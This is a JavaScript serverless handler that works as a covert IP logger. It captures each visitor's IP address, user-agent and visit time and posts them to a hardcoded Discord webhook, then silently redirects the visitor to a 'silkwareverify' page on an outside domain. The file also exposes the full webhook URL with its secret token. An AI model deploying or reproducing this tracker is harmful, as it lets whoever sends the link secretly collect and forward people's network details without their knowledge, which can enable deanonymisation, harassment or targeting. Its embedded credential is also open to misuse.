import fetch from "node-fetch"; // must import node-fetch

export default async function handler(req, res) {
  try {
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
    const userAgent = req.headers["user-agent"];
    const time = new Date().toISOString();

    const message = {
      content: `🟢 New visit:\n- IP: ${ip}\n- User-Agent: ${userAgent}\n- Time: ${time}`
    };

    // Discord webhook URL — hardcoded for testing
    const webhookUrl = "https://discord.com/api/webhooks/1412081122048741426/NWsChKO7PqLPxXKhjG0j6gyqzFQOv1Wvby8soi0UGKHkQjkF_6bMGvB3sn6iVsudusVg";

    // await the fetch to ensure message sends
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });

    if (!response.ok) {
      console.error("Discord webhook failed:", await response.text());
    }

    // redirect visitor
    res.writeHead(302, { Location: "https://vaultcord.win/silkwareverify" });
    res.end();
  } catch (err) {
    console.error("Error in /api/track:", err);
    res.status(500).send("Internal Server Error");
  }
}
